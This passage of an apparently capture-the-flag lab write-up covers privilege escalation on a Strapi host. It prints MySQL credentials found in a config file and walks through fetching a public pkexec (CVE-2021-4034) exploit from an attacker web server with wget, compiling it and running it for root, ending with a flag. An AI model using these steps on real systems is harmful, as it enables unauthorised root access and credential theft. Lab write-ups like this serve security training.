If we attempt to run `sudo -l` to check which commands can be executed with root privileges from our current user, we are prompted for a password, which we do not have.
```bash
$ sudo -l
```
![alt text](Images/Sudo.png)

By browsing through the different directories and reaching `/myapi/config/environments/development`, we discover a set of MySQL credentials.

![alt text](Images/Credentials.png)
```bash
username: developer,
password: #J!:F9Zt2u
```
```bash
$ mysql -udeveloper -p
```
![alt text](Images/Mysql.png)

We now have access to the MySQL database.
```bash
$ show databases;
```
![alt text](Images/DB.png)
```bash
$ use strapi
```

![alt text](Images/DB2.png)
```bash
$ show tables;
```
![alt text](Images/DB3.png)

We do not find any tables of interest in the database.
```bash
$ which pkexec | xargs ls -l
```

![alt text](Images/pkexec.png)

We observe that the target machine has `pkexec` installed and is vulnerable. For this reason, we clone the corresponding GitHub repository locally in order to exploit this vulnerability.

![alt text](Images/pkexec2.png)
```bash
$ git clone https://github.com/berdav/CVE-2021-4034  
```

![alt text](Images/pkexec3.png)

Now we zip this information
```bash
$ zip -r comprimido.z CVE-2021-4034  
```
To transfer the downloaded repository to the victim machine, we start a local web server. ( In the target machine we will go to the TEMP directory to make sure that we have permission in this directory)
```bash
$ python3 -m http.server 80 
```
And in the taget machine we use:
```bash
$ wget http://10.10.16.94/comprimido.zip
```
![alt text](Images/pkexec4.png)

And now unzip the file in the target machine to execute
```bash
$ unzip comprimido.zip
```

![alt text](Images/unzip.png)

Now we go to the directory CVE-2021-4034 and we will compilate
```bash
$ make
```
![alt text](Images/Compilation.png)

And now we will execute and we will be root and we can see the flag.
```bash
$ ./cve-2021-4034
```
![alt text](Images/Exec.png)

![alt text](Images/RootFlag.png)
```bash
Root Flag --> 95891db764443266a85e8277ba9b02df
```


[Back](README.md)